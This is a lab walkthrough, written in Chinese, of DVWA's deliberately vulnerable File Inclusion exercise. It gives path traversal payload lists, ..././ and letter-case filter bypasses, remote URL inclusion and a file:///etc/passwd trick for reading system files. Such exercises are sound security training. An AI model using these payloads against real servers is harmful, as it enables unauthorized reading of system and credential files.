# DVWA-File Inclusion

## low 


```
http://dvwa.com/vulnerabilities/fi/?page=file1.php
```


burp使用 intruder 設定payload位置
```
GET /vulnerabilities/fi/?page=§§/etc/passwd 
```

payload
```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
../../../../../../../../
../../../../../../../../../
../../../../../../../../../../
../../../../../../../../../../../
../../../../../../../../../../../../
../../../../../../../../../../../../../
../../../../../../../../../../../../../../
../../../../../../../../../../../../../../../
```

這兩個都可以一個是絕對路徑，一個是相對
```
/etc/passwd 

../../../../../../etc/passwd
```


甚至可以外部URL
```
https://translate.google.com/?sl=auto&tl=zh-CN&text=123&op=translate
```



## medium 


上個payload
```
#success
/etc/passwd

#failed
../../../../../../etc/passwd

#failed
https://translate.google.com/?sl=auto&tl=zh-CN&text=123&op=translate
```



雙寫繞過
```
..././
..././..././
..././..././..././
..././..././..././..././
..././..././..././..././..././
..././..././..././..././..././..././
..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././..././..././..././..././..././
..././..././..././..././..././..././..././..././..././..././..././..././..././..././..././
```




繞過
```
#雙寫
hhttps://ttps://translate.google.com/?sl=auto&tl=zh-CN&text=123&op=translate

#大小寫
Https://translate.google.com/?sl=auto&tl=zh-CN&text=123&op=translate
```




## high


```
/etc/passwd
# ERROR: File not found!



Https://translate.google.com/?sl=auto&tl=zh-CN&text=123&op=translate
# ERROR: File not found!


```

這四個是允許的
```
http://dvwa.com/vulnerabilities/fi/?page=file1.php
http://dvwa.com/vulnerabilities/fi/?page=file2.php
http://dvwa.com/vulnerabilities/fi/?page=file3.php
http://dvwa.com/vulnerabilities/fi/?page=include.php
```

查看了code，發現只剩下 file協議

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```



你指的是以 URL 格式表示的文件路徑。在 URL 中，"file://" 用於指示所引用的資源是本地系統上的文件。

例如：
- `file:///etc/passwd` 指的是您本地文件系統中的 "/etc/passwd" 文件。










## impossible

白名單無法